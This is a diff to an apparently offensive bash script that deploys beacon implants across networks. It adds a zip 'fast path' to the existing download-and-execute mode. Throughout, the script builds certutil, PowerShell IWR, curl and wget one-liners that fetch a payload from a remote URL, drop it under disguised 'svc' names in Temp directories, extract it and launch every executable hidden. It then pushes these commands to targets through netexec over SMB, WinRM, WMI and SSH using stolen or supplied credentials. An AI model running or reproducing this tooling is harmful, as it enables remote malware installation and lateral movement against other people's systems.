@@ -150,7 +150,13 @@ BEACON_NAME=""
 LAST_XFER=""  # method cache: reuse what worked for previous binary on same host
 
 echo "[+] Binaries: ${BEACON_FILES[*]}"
-[[ $URL_ONLY -eq 1 ]] && echo "[+] Mode   : URL-only fast path (download+exec one-liner)"
+if [[ $URL_ONLY -eq 1 ]]; then
+  if [[ "${BEACON_URL,,}" == *.zip ]]; then
+    echo "[+] Mode   : URL-only fast path (download+unzip+exec)"
+  else
+    echo "[+] Mode   : URL-only fast path (download+exec one-liner)"
+  fi
+fi
 echo "[+] Targets : ${TARGETS[*]}"
 
 # ====================== AUTH SETUP ======================
@@ -573,21 +579,42 @@ exec_beacon() {
 
 # ====================== URL ONE-LINER (fast path) ======================
 # Single command: download + exec. No separate transfer/exec phases.
+# Auto-detects .zip URLs: downloads, extracts, runs every .exe inside.
 # Uses: ip, user, is_windows, BEACON_URL, BEACON_NAME, auth globals
 url_exec_oneliner() {
   local ip="$1" user="$2" is_windows="${3:-1}"
   local rnd=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 6)
   local out t0
 
+  # Detect zip URL (case-insensitive check on extension)
+  local is_zip=0
+  [[ "${BEACON_URL,,}" == *.zip ]] && is_zip=1
+
   if [[ $is_windows -eq 1 ]]; then
-    local drop="C:\\Windows\\Temp\\svc${rnd}.exe"
-    # certutil is the most reliable on older Windows; also try curl.exe and IWR
-    local oneliner="certutil -urlcache -split -f \"${BEACON_URL}\" \"${drop}\" >nul 2>nul & start /b \"\" \"${drop}\""
-    local oneliner_ps="\$p='${drop}';IWR -Uri '${BEACON_URL}' -OutFile \$p;Start-Process \$p -WindowStyle Hidden"
+    local dir="C:\\Windows\\Temp\\svc${rnd}"
+
+    if [[ $is_zip -eq 1 ]]; then
+      # --- ZIP MODE (Windows) ---
+      # cmd: mkdir, certutil download, tar extract, delete zip, run all .exe
+      local oneliner="mkdir \"${dir}\" & certutil -urlcache -split -f \"${BEACON_URL}\" \"${dir}\\p.zip\" >nul 2>nul & cd /d \"${dir}\" & tar -xf p.zip 2>nul & del /q p.zip 2>nul & for %f in (*.exe) do start /b \"\" \"${dir}\\%f\""
+      # PowerShell: New-Item, IWR, Expand-Archive, run all .exe
+      local oneliner_ps="\$d='${dir}';New-Item -ItemType Directory -Path \$d -Force|Out-Null;IWR -Uri '${BEACON_URL}' -OutFile \"\$d\\p.zip\";Expand-Archive \"\$d\\p.zip\" \$d -Force;Remove-Item \"\$d\\p.zip\" -Force;Get-ChildItem \"\$d\\*.exe\"|ForEach-Object{Start-Process \$_.FullName -WindowStyle Hidden}"
+      local label_cmd="zip:certutil+tar+exec"
+      local label_ps="zip:IWR+Expand-Archive+exec"
+    else
+      # --- EXE MODE (Windows) ---
+      local drop="${dir}.exe"
+      local oneliner="certutil -urlcache -split -f \"${BEACON_URL}\" \"${drop}\" >nul 2>nul & start /b \"\" \"${drop}\""
+      local oneliner_ps="\$p='${drop}';IWR -Uri '${BEACON_URL}' -OutFile \$p;Start-Process \$p -WindowStyle Hidden"
+      local label_cmd="certutil+exec"
+      local label_ps="IWR+exec"
+    fi
+    local drop_display="${dir}"
+    [[ $is_zip -eq 0 ]] && drop_display="${dir}.exe"
 
     # Try via SMB (cmd one-liner)
     if port_open "$ip" 445; then
-      dbg "oneliner: nxc smb -x certutil+start"
+      dbg "oneliner: nxc smb -x ${label_cmd}"
       t0=$(timer_now)
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$oneliner" 2>&1)
@@ -596,15 +623,15 @@ url_exec_oneliner() {
       fi
       dbg "oneliner smb: took $(timer_diff "$t0" "$(timer_now)")"
       if echo "$out" | grep -qi '\[+\]'; then
-        echo "    [+] One-liner (certutil+exec via smb) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        echo "    [+] One-liner (${label_cmd} via smb) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
         return 0
       fi
-      dbg_output "oneliner(smb/certutil)" 1 "$out"
+      dbg_output "oneliner(smb/${label_cmd})" 1 "$out"
     fi
 
     # Try via WinRM (PowerShell one-liner)
     if port_open "$ip" 5985; then
-      dbg "oneliner: nxc winrm -X IWR+Start-Process"
+      dbg "oneliner: nxc winrm -X ${label_ps}"
       t0=$(timer_now)
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -X "$oneliner_ps" 2>&1)
@@ -613,15 +640,15 @@ url_exec_oneliner() {
       fi
       dbg "oneliner winrm: took $(timer_diff "$t0" "$(timer_now)")"
       if echo "$out" | grep -qi '\[+\]'; then
-        echo "    [+] One-liner (IWR+exec via winrm) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        echo "    [+] One-liner (${label_ps} via winrm) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
         return 0
       fi
-      dbg_output "oneliner(winrm/iwr)" 1 "$out"
+      dbg_output "oneliner(winrm/${label_ps})" 1 "$out"
     fi
 
     # Try via WMI (cmd one-liner)
     if port_open "$ip" 135; then
-      dbg "oneliner: nxc wmi -x certutil+start"
+      dbg "oneliner: nxc wmi -x ${label_cmd}"
       t0=$(timer_now)
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$oneliner" 2>&1)
@@ -630,41 +657,51 @@ url_exec_oneliner() {
       fi
       dbg "oneliner wmi: took $(timer_diff "$t0" "$(timer_now)")"
       if echo "$out" | grep -qi '\[+\]'; then
-        echo "    [+] One-liner (certutil+exec via wmi) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        echo "    [+] One-liner (${label_cmd} via wmi) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
         return 0
       fi
-      dbg_output "oneliner(wmi/certutil)" 1 "$out"
+      dbg_output "oneliner(wmi/${label_cmd})" 1 "$out"
     fi
 
     # Try via SSH (Windows OpenSSH)
     if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
-      local ssh_cmd="certutil -urlcache -split -f \"${BEACON_URL}\" \"${drop}\" >nul 2>nul & start /b \"\" \"${drop}\""
-      dbg "oneliner: nxc ssh -x certutil+start"
+      dbg "oneliner: nxc ssh -x ${label_cmd}"
       t0=$(timer_now)
-      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$ssh_cmd" 2>&1)
+      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$oneliner" 2>&1)
       dbg "oneliner ssh: took $(timer_diff "$t0" "$(timer_now)")"
       if echo "$out" | grep -qi '\[+\]'; then
-        echo "    [+] One-liner (certutil+exec via ssh) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        echo "    [+] One-liner (${label_cmd} via ssh) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
         return 0
       fi
-      dbg_output "oneliner(ssh/certutil)" 1 "$out"
+      dbg_output "oneliner(ssh/${label_cmd})" 1 "$out"
     fi
 
   else
-    # Linux one-liner
-    local drop="/tmp/svc${rnd}"
-    local dl_cmd="curl -sSLo '${drop}' '${BEACON_URL}' || wget -qO '${drop}' '${BEACON_URL}'; chmod +x '${drop}'; nohup '${drop}' </dev/null &>/dev/null &"
+    # ---- Linux ----
+    if [[ $is_zip -eq 1 ]]; then
+      # --- ZIP MODE (Linux) ---
+      local dir="/tmp/svc${rnd}"
+      local dl_cmd="mkdir -p '${dir}'; curl -sSLo '${dir}/p.zip' '${BEACON_URL}' || wget -qO '${dir}/p.zip' '${BEACON_URL}'; cd '${dir}'; unzip -o p.zip 2>/dev/null || python3 -c \"import zipfile;zipfile.ZipFile('p.zip').extractall('.')\" 2>/dev/null; rm -f p.zip; chmod +x * 2>/dev/null; for f in *; do [ -f \"\$f\" ] && [ -x \"\$f\" ] && nohup ./\"\$f\" </dev/null &>/dev/null & done"
+      local drop_display="${dir}/"
+      local label="zip:curl+unzip+exec"
+    else
+      # --- EXE MODE (Linux) ---
+      local drop="/tmp/svc${rnd}"
+      local dl_cmd="curl -sSLo '${drop}' '${BEACON_URL}' || wget -qO '${drop}' '${BEACON_URL}'; chmod +x '${drop}'; nohup '${drop}' </dev/null &>/dev/null &"
+      local drop_display="${drop}"
+      local label="curl+exec"
+    fi
 
     if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
-      dbg "oneliner: nxc ssh linux dl+exec"
+      dbg "oneliner: nxc ssh linux ${label}"
       t0=$(timer_now)
       out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$dl_cmd" 2>&1)
       dbg "oneliner ssh: took $(timer_diff "$t0" "$(timer_now)")"
       if echo "$out" | grep -qi '\[+\]'; then
-        echo "    [+] One-liner (curl+exec via ssh) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        echo "    [+] One-liner (${label} via ssh) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
         return 0
       fi
-      dbg_output "oneliner(ssh/curl)" 1 "$out"
+      dbg_output "oneliner(ssh/${label})" 1 "$out"
     fi
   fi
 
